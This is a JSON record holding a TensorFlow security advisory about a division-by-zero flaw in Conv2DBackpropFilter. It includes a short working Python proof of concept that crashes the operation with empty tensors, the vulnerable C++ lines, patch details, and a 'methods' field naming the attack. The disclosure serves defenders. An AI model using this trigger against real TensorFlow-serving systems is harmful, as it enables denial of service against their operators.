{"description": "### Impact\nAn attacker can cause a division by zero to occur in `Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([0, 0, 0, 0], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes,\n  out_backprop=out_backprop,\n  strides=[1, 1, 1, 1],\n  use_cudnn_on_gpu=False,\n  padding='SAME',\n  explicit_paddings=[],\n  data_format='NHWC',\n  dilations=[1, 1, 1, 1]\n)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L513-L522) computes a divisor based on user provided data (i.e., the shape of the tensors given as arguments):\n\n```cc\nconst size_t size_A = output_image_size * filter_total_size; \nconst size_t size_B = output_image_size * dims.out_depth;\nconst size_t size_C = filter_total_size * dims.out_depth;\nconst size_t work_unit_size = size_A + size_B + size_C;\nconst size_t shard_size = (target_working_set_size + work_unit_size - 1) / work_unit_size;\n```\n\nIf all shapes are empty then `work_unit_size` is 0. Since there is no check for this case before division, this results in a runtime exception, with potential to be abused for a denial of service. \n\n### Patches\nWe have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Division by zero in `Conv2DBackpropFilter` to cause a runtime exception and potential denial of service."]}
